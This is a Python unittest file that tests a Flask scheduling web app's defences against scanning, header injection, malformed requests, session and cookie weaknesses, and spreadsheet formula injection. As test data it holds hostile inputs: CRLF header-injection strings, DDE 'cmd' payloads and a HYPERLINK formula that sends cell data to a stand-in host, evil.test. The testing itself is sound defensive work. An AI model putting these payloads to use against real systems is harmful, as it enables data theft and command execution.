# © 2026 Omar Mokhtar. All rights reserved.
"""Phase BG (owner, 2026-11-03: "test more hacking things, make sure any client won't refuse this for security"). A second round of
attacks, after Phase BF: what a scanner or a careful tester tries next. Made-up data only."""
import re
import unittest

from webapp.app import password_problem
from webapp.tests.test_at_security import _Secured, PASSWORD
from webapp.tests.test_bf_attacks import LEAKS, TOKEN, rules, url_of
from webapp.tests.test_runs import sign_in, token


class ThePasswordRules(unittest.TestCase):
    def test_common_passwords_are_refused_even_with_digits_added(self):
        for weak in ("password1234", "Password123456", "qwertyuiop12", "1234567890", "welcome12345", "letmein123456",
                     "iloveyou2026", "administrator1", "Scheduler2026!", "aaaaaaaaaaaa", "abcdefghijkl", "0000000000"):
            self.assertTrue(password_problem(weak, weak, "someone"), weak)

    def test_ordinary_good_passwords_still_pass(self):
        for fine in ("Owner-pass-123", "Wall-pass-12345", "blue.Harbour.7412", "correct horse battery staple"):
            self.assertEqual(password_problem(fine, fine, "someone"), "", fine)


class ThePolicy(_Secured):
    def test_the_browser_refuses_to_turn_a_string_into_a_script_or_page(self):
        csp = self.app.test_client().get("/login").headers["Content-Security-Policy"]
        self.assertIn("require-trusted-types-for 'script'", csp)
        self.assertIn("trusted-types 'none'", csp)

    def test_the_site_script_writes_no_html_from_strings(self):
        import pathlib
        source = pathlib.Path(__file__).resolve().parents[1].joinpath("static", "app.js").read_text(encoding="utf-8")
        for sink in ("innerHTML", "outerHTML", "insertAdjacentHTML", "document.write", "eval(", "new Function", "createContextualFragment"):
            self.assertNotIn(sink, source, sink)


class TheScanner(_Secured):
    def test_files_a_scanner_looks_for_are_not_served(self):
        client = self.app.test_client()
        for path in ("/.git/config", "/.env", "/scheduler.db", "/webapp/app.py", "/static/", "/static/../app.py",
                     "/static/%2e%2e/app.py", "/backup.zip", "/admin", "/phpinfo.php", "/server-status", "/.DS_Store",
                     "/config.json", "/requirements.txt", "/deploy/install.sh", "/data/scheduler.db", "/swagger.json",
                     "/openapi.json", "/console", "/debug", "/_debug_toolbar/", "/.well-known/../app.py"):
            got = client.get(path)
            body = got.get_data(as_text=True)
            self.assertNotEqual(got.status_code, 200 if path not in ("/admin",) else -1, path)
            self.assertNotRegex(body, r"(?i)secret_key|\[core\]|DB_PASSWORD|BEGIN (RSA|OPENSSH)", path)

    def test_the_server_names_nothing(self):
        got = self.app.test_client().get("/login")
        for header in ("Server", "X-Powered-By", "X-AspNet-Version", "Via"):
            self.assertNotRegex(got.headers.get(header, ""), r"(?i)werkzeug|waitress|python|flask|\d+\.\d+")
        self.assertNotRegex(got.get_data(as_text=True), r"(?i)werkzeug|waitress|jinja|<meta name=\"generator\"")

    def test_a_header_cannot_be_split_by_a_line_break_in_a_value(self):
        client = sign_in(self.app, "plan_a", PASSWORD)
        for path in ("/login?next=/%0d%0aSet-Cookie:x=1", "/?tz=x%0d%0aX-Evil:1", "/day?program=x%0d%0aX-Evil:1"):
            got = client.get(path)
            self.assertNotIn("X-Evil", got.headers)
            self.assertNotIn("x", [c.split("=")[0] for c in got.headers.getlist("Set-Cookie") if c.startswith("x=")])

    def test_a_method_override_header_does_not_turn_a_get_into_a_change(self):
        client = sign_in(self.app, "plan_a", PASSWORD)
        before = len(self.store.list_runs())
        for header in ("X-HTTP-Method-Override", "X-Method-Override", "X-HTTP-Method"):
            got = client.get("/runs/1/delete", headers={header: "POST"})
            self.assertIn(got.status_code, (404, 405, 302, 403))
        self.assertEqual(len(self.store.list_runs()), before)

    def test_strange_requests_get_a_plain_refusal_never_a_crash(self):
        client = self.app.test_client()
        cases = [("/", {"query_string": "a=" + "b" * 70000}), ("/login", {"query_string": "&".join(f"k{i}=v" for i in range(3000))}),
                 ("/%ff%fe", {}), ("/\x00", {}), ("/login", {"headers": {"Cookie": "session=" + "A" * 9000}}),
                 ("/", {"headers": {"Accept-Language": "x" * 20000}}), ("/", {"headers": {"Content-Length": "-1"}}),
                 ("/runs", {"method": "POST", "data": b"\xff\xfe", "content_type": "application/x-www-form-urlencoded"}),
                 ("/runs", {"method": "POST", "data": "{" * 10000, "content_type": "application/json"}),
                 ("/login", {"method": "POST", "data": "username=" + "a" * 200000 + "&password=x",
                             "content_type": "application/x-www-form-urlencoded"})]
        for path, kwargs in cases:
            try:
                got = client.open(path, **kwargs)
            except Exception as exc:  # the test client itself refusing is also a refusal
                continue
            self.assertLess(got.status_code, 500, (path, got.status_code))
            self.assertNotRegex(got.get_data(as_text=True), LEAKS, path)

    def test_a_username_that_is_a_lookalike_does_not_reach_another_account(self):
        client = self.app.test_client()
        tok = TOKEN.search(client.get("/login").get_data(as_text=True)).group(1)
        for lookalike in ("PLAN_A", " plan_a ", "plan_a​", "plan＿a", "plаn_a"):
            got = client.post("/login", data={"username": lookalike, "password": "definitely-wrong-1", "csrf_token": tok})
            self.assertNotEqual(got.status_code, 302, lookalike)


class TheForcedPasswordChange(_Secured):
    def test_a_person_who_must_change_the_password_can_reach_nothing_else(self):
        uid = self.store.add_user("temp_user", "Temp User", "Temp-pass-12345", must_change=True)
        client = sign_in(self.app, "temp_user", "Temp-pass-12345")
        tok = TOKEN.search(client.get("/account/password").get_data(as_text=True)).group(1)
        for rule in rules(self.app, "GET"):
            if rule.endpoint in ("change_password", "set_theme"):
                continue
            got = client.get(url_of(self.app, rule))
            self.assertIn(got.status_code, (302, 303, 403, 404, 405), (rule.rule, got.status_code))
            if got.status_code in (302, 303):
                self.assertIn("password", got.headers.get("Location", ""), rule.rule)
        for rule in rules(self.app, "POST"):
            if rule.endpoint in ("change_password", "set_theme", "logout"):
                continue
            got = client.post(url_of(self.app, rule), data={"csrf_token": tok})
            self.assertIn(got.status_code, (302, 303, 400, 403, 404, 405), (rule.rule, got.status_code))
            if got.status_code in (302, 303):
                self.assertIn("password", got.headers.get("Location", ""), rule.rule)

    def test_changing_the_password_ends_every_other_session(self):
        a = sign_in(self.app, "plan_a", PASSWORD)
        b = sign_in(self.app, "plan_a", PASSWORD)
        self.assertEqual(a.get("/").status_code, 200)
        got = a.post("/account/password", data={"csrf_token": token(a), "current": PASSWORD, "new": "Brand-new-pass-77",
                                                "confirm": "Brand-new-pass-77"})
        self.assertIn(got.status_code, (200, 302, 303))
        self.assertNotEqual(b.get("/", follow_redirects=False).status_code, 200, "an old session survived a password change")
        self.store.set_password(self.users["plan_a"], PASSWORD)


class TheCookies(_Secured):
    def test_every_cookie_the_site_sets_is_httponly_and_samesite(self):
        client = self.app.test_client()
        tok = TOKEN.search(client.get("/login").get_data(as_text=True)).group(1)
        got = client.post("/login", data={"username": "plan_a", "password": PASSWORD, "csrf_token": tok})
        got2 = client.post("/theme", data={"theme": "dark", "csrf_token": tok})
        for header in got.headers.getlist("Set-Cookie") + got2.headers.getlist("Set-Cookie"):
            self.assertIn("HttpOnly", header, header[:40])
            self.assertIn("SameSite=", header, header[:40])
            self.assertIn("Path=/", header, header[:40])

    def test_a_downloaded_file_is_never_cached_or_sniffed(self):
        client = sign_in(self.app, "omar", "Owner-pass-123") if False else sign_in(self.app, "plan_a", PASSWORD)
        got = client.get("/exports/download", query_string={"from": "2026-10-01", "to": "2026-10-31", "format": "xlsx",
                                                            "kind": ["attendance"]})
        if got.status_code == 200:
            self.assertEqual(got.headers.get("X-Content-Type-Options"), "nosniff")
            self.assertIn("no-store", got.headers.get("Cache-Control", ""))
            self.assertIn("attachment", got.headers.get("Content-Disposition", ""))


class TheHttpsSite(unittest.TestCase):
    """On the real server (HTTPS) the cookie is bound to this exact host and the browser is told to forget on sign-out."""

    @classmethod
    def setUpClass(cls):
        from webapp.tests.test_runs import make_app
        cls.app, cls.store, *_ = make_app(start_worker=False, HTTPS=True, SESSION_COOKIE_SECURE=True)
        cls.store.add_user("omar", "Omar", "Owner-pass-123", is_admin=True, must_change=False)

    def login(self):
        client = self.app.test_client()
        tok = TOKEN.search(client.get("/login", base_url="https://site.test").get_data(as_text=True)).group(1)
        got = client.post("/login", data={"username": "omar", "password": "Owner-pass-123", "csrf_token": tok},
                          base_url="https://site.test")
        return client, got

    def test_the_session_cookie_uses_the_host_prefix(self):
        _client, got = self.login()
        header = "; ".join(got.headers.getlist("Set-Cookie"))
        self.assertIn("__Host-session=", header)
        for part in ("Secure", "HttpOnly", "SameSite=Lax", "Path=/"):
            self.assertIn(part, header)
        self.assertNotIn("Domain=", header)

    def test_the_policy_upgrades_any_stray_plain_request(self):
        csp = self.app.test_client().get("/login", base_url="https://site.test").headers["Content-Security-Policy"]
        self.assertIn("upgrade-insecure-requests", csp)

    def test_sign_out_tells_the_browser_to_clear_what_it_kept(self):
        client, _ = self.login()
        tok = TOKEN.search(client.get("/", base_url="https://site.test").get_data(as_text=True) or "")
        tok = tok.group(1) if tok else ""
        got = client.post("/logout", data={"csrf_token": tok}, base_url="https://site.test")
        self.assertIn("cache", got.headers.get("Clear-Site-Data", ""))
        self.assertIn("storage", got.headers.get("Clear-Site-Data", ""))


class TheSpreadsheetsCannotRunWhatPeopleType(_Secured):
    """Excel injection: a note that starts with = + - or @ must never become a formula in a file the site hands out."""
    EVIL = ('=HYPERLINK("http://evil.test/?x="&A1,"click")', "+cmd|' /C calc'!A0", "-2+3+cmd|' /C calc'!A0", "@SUM(1+1)*cmd|' /C calc'!A0")

    def test_no_download_contains_a_formula_made_from_typed_text(self):
        import io
        from openpyxl import load_workbook
        store, admin = self.store, self.admin_id
        for i, text in enumerate(self.EVIL):
            store.set_attendance(program=self.alpha, shift_date="2026-10-14", associate=f"Alpha Person {i}", status="Sick",
                                 from_min=None, to_min=None, billable=0, user_id=admin, at=1.0)
            store.add_activity(program=self.alpha, shift_date="2026-10-14", associate="Alpha Person One", kind="Coaching", start=600 + i,
                               end_min=630 + i, billable=0, note=text, user_id=admin, at=1.0)
            store.add_day_log(program=self.alpha, shift_date="2026-10-14", associate="Alpha Person One", what=text, user_id=admin, at=1.0)
            store.add_event(at=1.0, user_id=admin, kind="record", program=self.alpha, subject=text, detail=text)
            store.add_leave(program=self.alpha, associate="Alpha Person One", user_id=admin, kind="Annual", first_day="2026-10-20",
                            last_day="2026-10-21", note=text)
        client = sign_in(self.app, "omar", "Owner-pass-123")
        ids = {"run_id": self.runs[self.alpha], "schedule_id": self.sched[self.alpha], "name": self.alpha, "user_id": admin,
               "request_id": 1, "swap_id": 1}
        checked, formulas = 0, []
        for rule in rules(self.app, "GET"):
            args = {a: ids.get(a, "plan") for a in rule.arguments}
            with self.app.test_request_context():
                from flask import url_for
                try:
                    url = url_for(rule.endpoint, **args)
                except Exception:
                    continue
            query = {"program": self.alpha, "from": "2026-10-01", "to": "2026-10-31", "format": "xlsx", "date": "2026-10-14",
                     "week": "2026-10-11", "kind": list(__import__("webapp.exports", fromlist=["KINDS"]).KINDS)}
            got = client.get(url, query_string=query)
            self.assertLess(got.status_code, 500, rule.rule)
            if got.status_code != 200 or "spreadsheet" not in got.headers.get("Content-Type", ""):
                continue
            checked += 1
            wb = load_workbook(io.BytesIO(got.data))
            for ws in wb.worksheets:
                for row in ws.iter_rows():
                    for cell in row:
                        if cell.data_type == "f" and any(bad.lstrip("=+-@")[:8] in str(cell.value) for bad in self.EVIL):
                            formulas.append((rule.rule, ws.title, cell.coordinate, str(cell.value)[:40]))
        self.assertGreater(checked, 2, "too few workbook downloads were reached by the sweep")
        self.assertEqual(formulas, [], "typed text became a formula in a download")


if __name__ == "__main__":
    unittest.main()
